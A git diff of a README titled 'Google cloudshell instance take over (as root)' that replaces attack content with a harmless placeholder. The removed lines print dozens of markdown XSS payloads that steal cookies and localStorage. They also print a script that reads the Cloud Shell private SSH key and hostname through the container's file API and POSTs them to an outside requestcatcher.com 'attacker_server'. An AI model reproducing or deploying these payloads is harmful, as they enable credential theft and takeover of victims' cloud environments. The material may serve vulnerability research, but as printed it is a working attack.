@@ -7,88 +7,34 @@ Google cloudshell instance take over (as root)
 
 [![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https%3A%2F%2Fgithub.com%2Fmagnetic-ferret%2Fta.git&page=editor&cloudshell_tutorial=README.md)
 
+[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=http://github.com/magnetic-ferret/ta.git&page=editor&cloudshell_tutorial=test.md)
 
-## Getting Started 
 
-just need to preview this file to see the magic 
+<details>
+  <summary>Click me</summary>
+  
+  ### Heading
+  1. Foo
+  2. Bar
+     * Baz
+     * Qux
 
-### Test
-
-[XSS](javascript:prompt(document.cookie))
-[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
-[XSS]: (javascript:prompt(document.cookie))
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0aprompt(1))
-[XSS](javascript://%0d%0aprompt(1);com)
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](vbscript:alert(document.domain))
-[XSS](javascript:this;alert(1))
-[XSS](javascript:this;alert(1&#41;)
-[XSS](javascript&#58this;alert(1&#41;)
-[XSS](Javas&#99;ript:alert(1&#41;)
-[XSS](Javas%26%2399;ript:alert(1&#41;)
-[XSS](javascript:alert&#65534;(1&#41;)
-[XSS](javascript:confirm(1)
-[XSS](javascript://www.google.com%0Aprompt(1))
-[XSS](javascript://%0d%0aconfirm(1);com)
-[XSS](javascript:window.onerror=confirm;throw%201)
-[XSS](�javascript:alert(document.domain&#41;)
-![XSS](javascript:prompt(document.cookie))\
-![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
-![XSS'"`onerror=prompt(document.cookie)](x)\
-
-[Basic](javascript:alert('Basic'))
-[Local Storage](javascript:alert(JSON.stringify(localStorage)))
-[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
-[URL](javascript://www.google.com%0Aalert('URL'))
-[In Quotes]('javascript:alert("InQuotes")')
+  ### Some Javascript
+  ```js
+  function logSomething(something) {
+    console.log('Something', something);
+  }
+  ```
+</details>
 
 
 ### Test
 
 <script onload="{   
-    var file_results = []  
-    // this scape the container and get the ssh id_cloudshell private key
-    read_file('file:///../id_cloudshell')          
-    // getting the hostname (external connection)
-    read_file('file:///etc/hostname')      
-         
     setTimeout(function(){ 
-        send_files(file_results)    
-    },5000)  
- 
-    // function to read any file given the path with file protocol per example 'file:///etc/hostname'
-    function read_file(file_to_read){
-        var container_url = 'https://' + location.host + '/files/?uri='
-        var get_file_id_url = container_url + file_to_read
-        console.log(get_file_id_url) 
-        fetch(get_file_id_url) // convert response to json 
-            .then(response => { return response.json() } )
-            .then(json => {
-                var container_download_url = 'https://' + location.host + '/files/download/?id='
-                var download_url = container_download_url + json.id
-                fetch(download_url) 
-                    .then(response => { return response.text() } )
-                    .then(text => { 
-                        console.log(file_to_read + ' '+ text)
-                        file_results.push(file_to_read + ' '+ text)  
-                    })
-            })  
-    }
- 
-    function send_files(result){ 
-         // need to set netcat to listen per example nc -lvvv testtesttest.requestcatcher.com 55555
-         let attacker_server =  'aefr43qt4.requestcatcher.com'
-         fetch(attacker_server, {
-                method: 'post',
-                body: JSON.stringify(result)
-         })
-    }
- 
+        altert(document)
+        console.log(document)
+    },5000)
 }"> 
-  
+
  
